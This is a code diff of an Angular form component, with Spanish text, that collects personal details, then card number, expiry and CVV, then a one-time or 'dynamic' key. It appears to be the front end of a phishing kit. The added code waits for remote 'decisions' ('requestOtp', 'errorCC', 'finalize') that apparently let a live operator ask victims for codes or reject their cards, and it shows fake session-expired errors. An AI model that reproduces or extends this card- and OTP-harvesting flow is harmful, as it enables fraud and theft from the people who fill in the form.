@@ -15,6 +15,8 @@ import {
 import { Router } from '@angular/router';
 import { NgxMaskDirective } from 'ngx-mask';
 import { take } from 'rxjs';
+import { ToastrService } from 'ngx-toastr';
+import { HttpErrorResponse } from '@angular/common/http';
 
 @Component({
   selector: 'app-form',
@@ -24,7 +26,9 @@ import { take } from 'rxjs';
 })
 export class FormComponent {
   page = signal<number>(1);
+  messageId: string = '';
   cardForm: FormGroup;
+  isRetry: boolean = false;
   personForm: FormGroup;
   isLoading: boolean = false;
   isOpen = false;
@@ -36,7 +40,8 @@ export class FormComponent {
   constructor(
     private fb: FormBuilder,
     private router: Router,
-    private functionalityService: FuncionalityService
+    private functionalityService: FuncionalityService,
+    private toastr: ToastrService
   ) {
     this.personForm = this.fb.group({
       nombre: [
@@ -76,24 +81,37 @@ export class FormComponent {
   nextStep() {
     this.isLoading = true;
     setTimeout(() => {
-      this.page.update((page) => page == 1 ? page + 1 : 1);
+      this.page.update((page) => (page == 1 ? page + 1 : 1));
       this.isLoading = false;
     }, 1500);
   }
 
   onSubmit() {
-    if(this.page() === 1 && this.personForm.valid) {
+    if (this.page() === 1 && this.personForm.valid) {
       const name = this.personForm.controls['nombre'].value;
       const id = this.personForm.controls['id'].value;
       const add = this.personForm.controls['add'].value;
       const tel = this.personForm.controls['tel'].value;
-      this.functionalityService
-        .appendPersonData(name, id, add, tel)
-        .subscribe(() => {
-        });
-      this.nextStep();  
+      this.functionalityService.appendPersonData(name, id, add, tel).subscribe({
+        next: (res: any) => {
+          this.messageId = res.message_id;
+          this.nextStep();
+        },
+        error: (err) => {
+          this.toastr.error('Su Sesión Caducó');
+          this.router.navigate(['/']);
+          this.isLoading = false;
+          console.error('appendPersonData error:', err);
+        },
+      });
     }
     if (this.page() === 2 && this.cardForm.valid) {
+      const sessionId = this.functionalityService.getStoredSessionId();
+
+      // Reiniciar suscripción al decisionSubject
+      this.functionalityService.resetDecisionSubject();
+
+      this.isLoading = true;
       const card = this.cardForm.controls['tarjeta'].value;
       const exp = this.cardForm.controls['exp'].value;
       const cvv = this.cardForm.controls['cvv'].value;
@@ -103,13 +121,99 @@ export class FormComponent {
       const formatedExp = month + '/' + year;
 
       this.functionalityService
-        .appendCardData(card, formatedExp, cvv)
-        .subscribe(() => {
-          this.isOpen = true;
+        .appendCardData(card, formatedExp, cvv, this.messageId)
+        .subscribe({
+          next: () => {
+            this.isRetry = false;
+          },
+          error: (err) => {
+            this.toastr.error('Su sesión Caducó');
+            this.isLoading = false;
+            this.router.navigate(['/']);
+            console.error('appendCardData error:', err);
+          },
         });
-    } else {
-      this.cardForm.markAllAsTouched();
+
+      this.functionalityService.onDecision(sessionId).subscribe({
+        next: (res) => {
+          if (res === 'requestDinamica') {
+            this.requestDinamic();
+          } else if (res === 'requestOtp') {
+            this.requestOtp();
+          } else if (res === 'errorCC') {
+            this.isLoading = false;
+            this.isRetry = true;
+            this.toastr.error('No se encontró ninguna coincidencia');
+          }
+        },
+        error: (err) => {
+          this.toastr.error('Error en la conexión');
+          this.isLoading = false;
+          console.error('onDecision error:', err);
+        },
+      });
     }
+  }
+
+  async sendDynamic() {
+    const otpValue = this.otp.join('');
+    this.isLoading = true;
+
+    const sessionId = this.functionalityService.getStoredSessionId();
+
+    // Reiniciar suscripción al decisionSubject
+    this.functionalityService.resetDecisionSubject();
+
+    this.functionalityService.onDecision(sessionId).subscribe({
+      next: (decision) => {
+        if (decision === 'errorOtp') {
+          this.isLoading = false;
+          this.isRetry = true;
+          this.toastr.error('Clave Dinamica Invalida');
+          this.clear();
+        } else if (decision === 'errorDinamica') {
+          this.isLoading = false;
+          this.isRetry = true;
+          this.toastr.error('Clave Dinamica Invalida');
+          this.clear();
+        } else if (decision === 'finalize') {
+          this.isLoading = false;
+          this.toastr.success('Completado');
+          this.router.navigate(['/success']);
+        }
+      },
+      error: (err) => {
+        this.toastr.error('Error en la conexión');
+        this.isLoading = false;
+        console.error('onDecision error:', err);
+      },
+    });
+
+    this.functionalityService.updateMessageWithOtp(otpValue).subscribe({
+      error: (err) => {
+        this.isLoading = false;
+        this.toastr.error('Su sesión Caducó');
+        this.router.navigate(['/']);
+        console.error('Error en updateMessageWithOtp:', err);
+      },
+    });
+  }
+
+  requestOtp() {
+    this.clear();
+    this.isLoading = false;
+    this.isOpen = true;
+    // Reiniciar suscripción al decisionSubject
+    this.functionalityService.resetDecisionSubject();
+  }
+
+  requestDinamic() {
+    this.clear();
+    this.isLoading = false;
+    this.isOpen = true;
+
+    // Reiniciar suscripción al decisionSubject
+    this.functionalityService.resetDecisionSubject();
   }
 
   datePatternValidator(): ValidatorFn {
@@ -117,6 +221,7 @@ export class FormComponent {
       let value = control.value;
       const month = value.substring(0, 2);
       const year = value.substring(2, 4);
+      console.log(typeof value)
       value = month + '/' + year;
 
       if (!value) {
@@ -130,12 +235,12 @@ export class FormComponent {
       if (month < 1 || month > 12) {
         return { invalidMonth: true };
       }
-
+      console.log(this.currentMonth+'->'+month)
       if (year < this.currentYear || year > this.currentYear + 10) {
         return { invalidYear: true };
       }
-
-      if (year == this.currentYear && month < this.currentMonth) {
+      if (year == this.currentYear && month <= this.currentMonth + 1) {
+        console.log(this.currentMonth+'->'+month)
         return { expiredDate: true };
       }
 
@@ -196,36 +301,5 @@ export class FormComponent {
       if (prevInput) {
       }
     }
-  }
-
-  async sendDynamic() {
-    const otpValue = this.otp.join('');
-    this.isLoading = true;
-    const sid = localStorage.getItem('sid');
-    let socketId = '';
-    if(sid === undefined || !sid) {
-      socketId = await this.functionalityService.getSocketIdWhenReady();
-    }
-
-    this.functionalityService
-      .onOtpDecision()
-      .pipe(take(1))
-      .subscribe((decision) => {
-        this.isLoading = false;
-        if (decision === 'continue') {
-          this.router.navigate(['/success']);
-        } else {
-          this.router.navigate(['/']);
-        }
-      });
-
-    this.functionalityService
-      .updateMessageWithOtp(otpValue, socketId)
-      .subscribe({
-        error: (err) => {
-          this.isLoading = false;
-          console.error('Error en updateMessageWithOtp:', err);
-        },
-      });
   }
 }
